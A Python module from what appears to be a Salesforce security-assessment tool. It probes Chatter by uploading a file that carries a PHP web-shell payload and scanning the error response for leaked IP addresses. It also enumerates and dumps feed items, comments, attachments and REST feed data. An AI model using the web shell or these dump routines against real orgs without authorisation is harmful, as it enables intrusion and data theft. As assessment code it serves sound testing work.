# Built-in imports
import json
import os
import re
import uuid
from urllib.parse import urlparse

# Third-party imports
from loguru import logger

# Local imports
from ..client import AuraClient, REST_API_VERSION
from . import dump

_IP_RE = re.compile(r'\b(?:\d{1,3}\.){3}\d{1,3}\b')
_PRIVATE_RE = re.compile(r'^(10\.|172\.(1[6-9]|2\d|3[01])\.|192\.168\.|127\.)')


def _base_url(aura_url: str) -> str:
    parsed = urlparse(aura_url)
    return f"{parsed.scheme}://{parsed.netloc}"


def _check_file_upload(client: AuraClient, aura_url: str) -> dict | None:
    """
    POST a crafted multipart upload to /chatter/handlers/file/body.
    Returns a finding dict if any IP address is found in the error response,
    None otherwise.
    """
    boundary = f"sfmap{uuid.uuid4().hex}"
    body = (
        f"--{boundary}\r\n"
        "Content-Disposition: form-data; "
        'name="chatter[file]"; filename="sfmap_probe.php"\r\n'
        "Content-Type: application/x-php\r\n\r\n"
        "<?php echo shell_exec($_GET['cmd']); ?>\r\n"
        f"--{boundary}--\r\n"
    )
    endpoint = f"{_base_url(aura_url)}/chatter/handlers/file/body"

    try:
        resp = client._http.post(
            endpoint,
            content=body.encode("utf-8"),
            headers={"Content-Type": f"multipart/form-data; boundary={boundary}"},
        )
        logger.debug(f"Chatter file/body → HTTP {resp.status_code}")
        text = resp.text

        all_ips = list(dict.fromkeys(_IP_RE.findall(text)))
        if not all_ips:
            return None

        private = [ip for ip in all_ips if _PRIVATE_RE.match(ip)]
        leaked = private or all_ips

        snippet = text[:500].replace("\n", " ").strip()
        finding = {
            "endpoint": endpoint,
            "http_status": resp.status_code,
            "leaked_ips": leaked,
            "all_ips_in_response": all_ips,
            "response_snippet": snippet,
        }
        for ip in leaked:
            logger.warning(f"IP leak: {ip} via {endpoint} (HTTP {resp.status_code})")
        return finding

    except Exception:
        logger.exception("Chatter file/body probe failed")
        return None


def _enumerate_via_aura(client: AuraClient, output_dir: str) -> dict[str, int]:
    """Dump FeedItem, FeedComment and FeedAttachment via Aura getItems."""
    found: dict[str, int] = {}
    for obj in ("FeedItem", "FeedComment", "FeedAttachment"):
        rv = dump.get_items(client, obj, page_size=200, page=1, silent=True)
        if rv is None:
            logger.debug(f"Chatter {obj}: not accessible")
            continue
        total = rv.get("totalCount", len(rv.get("result", [])))
        found[obj] = total
        logger.warning(f"Chatter {obj}: {total} record(s) visible")
        dump.write_page(output_dir, obj, 1, rv)
    return found


def _enumerate_via_rest(client: AuraClient, aura_url: str, output_dir: str) -> dict[str, int]:
    """Probe Chatter REST feed endpoints."""
    base = _base_url(aura_url)
    endpoints = [
        f"/services/data/{REST_API_VERSION}/chatter/feeds/news/me/feed-elements",
        f"/services/data/{REST_API_VERSION}/chatter/feed-items",
        f"/services/data/{REST_API_VERSION}/chatter/users/me",
    ]
    found: dict[str, int] = {}

    for path in endpoints:
        try:
            resp = client.get(base + path)
            logger.debug(f"Chatter REST {path} → HTTP {resp.status_code}")
            if resp.status_code != 200:
                continue
            data = resp.json()
            count = data.get("totalSize") or data.get("currentPageSize") or 0
            found[path] = count
            logger.warning(f"Chatter REST {path}: {count} item(s) accessible")
            safe_name = path.strip("/").replace("/", "_")
            out_path = os.path.join(output_dir, f"rest_{safe_name}.json")
            with open(out_path, "w", encoding="utf-8") as fh:
                fh.write(json.dumps(data, ensure_ascii=False, indent=2))
        except Exception:
            logger.exception(f"Chatter REST probe error for {path}")

    return found


def run(client: AuraClient, aura_url: str, output_dir: str) -> dict:
    chatter_dir = os.path.join(output_dir, "chatter")
    os.makedirs(chatter_dir, exist_ok=True)

    file_upload_finding = _check_file_upload(client, aura_url)
    aura_objects = _enumerate_via_aura(client, chatter_dir)
    rest_endpoints = _enumerate_via_rest(client, aura_url, chatter_dir)

    summary = {
        "file_upload": file_upload_finding,
        "aura_objects": aura_objects,
        "rest_endpoints": rest_endpoints,
    }

    path = os.path.join(chatter_dir, "chatter_summary.json")
    with open(path, "w", encoding="utf-8") as fh:
        fh.write(json.dumps(summary, ensure_ascii=False, indent=2))

    findings_count = (
        (1 if file_upload_finding else 0)
        + len(aura_objects)
        + len(rest_endpoints)
    )
    if findings_count:
        logger.warning(f"Chatter: {findings_count} finding(s) saved to {path}")
    else:
        logger.success(f"Chatter: no findings, saved to {path}")

    return summary
